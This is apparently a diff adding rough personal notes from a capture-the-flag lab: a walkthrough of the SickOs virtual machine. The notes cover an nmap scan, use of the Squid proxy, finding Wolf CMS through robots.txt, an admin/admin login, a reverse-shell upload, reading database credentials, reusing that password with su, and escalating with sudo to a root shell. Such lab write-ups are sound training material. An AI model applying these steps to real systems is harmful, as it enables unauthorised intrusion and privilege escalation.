@@ -1,0 +1,61 @@
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: 00:0C:29:A5:21:72 (VMware)
+
+//as proxy is used, we config the proxy of webbrower to this ip and port as proxy.
+
+//we can visit a new page, and I dont konw how to fuzz the directory, just try the robots.txt. get a folder name. /wolfcms
+
+//it is a blog, after search of it, we can access to /admin, since I cannot fuzz!!
+
+//a login page, try admin/admin
+
+//works, and we can uopload without limitation. so areverse shell.
+
+// wolfcms/public/xxx the dir of uoploaded files.
+
+//so got a shell
+
+www-data@SickOs:/var/www/wolfcms$ cat config.php
+
+// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+
+mysql> select & from user;
+Administrator | admin@yoursite.com | admin    | salt 3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f
+
+
+www-data@SickOs:/var/www/wolfcms$ su sickos
+su sickos
+Password: john@123
+
+sickos@SickOs:/var/www/wolfcms$ sudo -l
+sudo -l
+[sudo] password for sickos: john@123
+
+Matching Defaults entries for sickos on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sickos may run the following commands on this host:
+    (ALL : ALL) ALL
+sickos@SickOs:/var/www/wolfcms$ /bin/bash
+/bin/bash
+sickos@SickOs:/var/www/wolfcms$ id
+id
+uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+sickos@SickOs:/var/www/wolfcms$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+sickos@SickOs:/var/www/wolfcms$ sudo /bin/bash
+sudo /bin/bash
